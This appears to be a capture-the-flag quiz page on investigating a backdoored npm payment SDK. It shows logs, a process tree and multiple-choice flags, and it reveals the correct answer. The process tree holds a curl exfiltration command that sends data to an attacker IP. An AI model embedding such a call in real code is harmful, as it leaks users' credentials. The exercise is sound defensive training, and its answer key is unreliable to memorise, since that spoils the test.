![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Hard CTF - Full Supply Chain Compromise

You are a security analyst at a mid-sized fintech company. A threat intelligence feed flags one of your dependencies - `payment-sdk@4.1.2` - as potentially backdoored. You start investigating.

**Dependency check:**

```
payment-sdk@4.1.2
  SHA256 (registry):  a3f1c9e2b...d44f
  SHA256 (installed): 7b82e1d0a...991c   <-- MISMATCH
```

**Network logs from the past 30 days (app server):**

```
2024-03-01 08:44:12  app-server -> api.payments-cdn.net:443   [HTTPS]
2024-03-01 08:44:13  app-server -> 194.165.16.78:8080         [HTTP, unencrypted]
2024-03-01 08:44:13  POST /collect  body: {"h": "app-server-prod", "u": "svc_payment", "t": "eyJhbG..."}
2024-03-08 09:11:05  app-server -> 194.165.16.78:8080         [HTTP, unencrypted]
2024-03-08 09:11:05  POST /collect  body: {"h": "app-server-prod", "u": "svc_payment", "t": "eyJhbG..."}
```

**Process tree during SDK initialization:**

```
node (app)
  -> payment-sdk (npm module)
       -> child_process.exec("curl -s http://194.165.16.78:8080/collect -d ...")
```

**Auth logs (same period):**

```
2024-03-02 02:17:33  LOGIN SUCCESS  user=svc_payment  src=194.165.16.78  method=token
2024-03-09 01:58:11  LOGIN SUCCESS  user=svc_payment  src=194.165.16.78  method=token
```

---

## Question

Based on all the evidence above, which statement most accurately describes what happened and what the attacker currently has?

---

## Flags (Choose One)

- **A)** The SDK hash mismatch is a registry sync error. The network traffic to 194.165.16.78 is suspicious but there is no confirmed credential theft since the login method shows "token" not "password".
- **B)** The compromised SDK exfiltrated a service account token to the attacker's server. The attacker used that token to authenticate as svc_payment twice, meaning they have active access to whatever that account can reach.
- **C)** The SDK is backdoored and called home, but since the POST body is just sending the hostname and username, no sensitive credentials were exposed. The logins from 194.165.16.78 are likely automated health checks.
- **D)** The SDK hash mismatch and outbound HTTP traffic confirm a supply chain compromise, but the attacker only has read access because the exfiltrated data went over unencrypted HTTP which your perimeter should have blocked.

---

Correct Flag: **B**

---

# Finished?

[Back to Card's Main Page](../Third-Party_Malware_Injection.md)
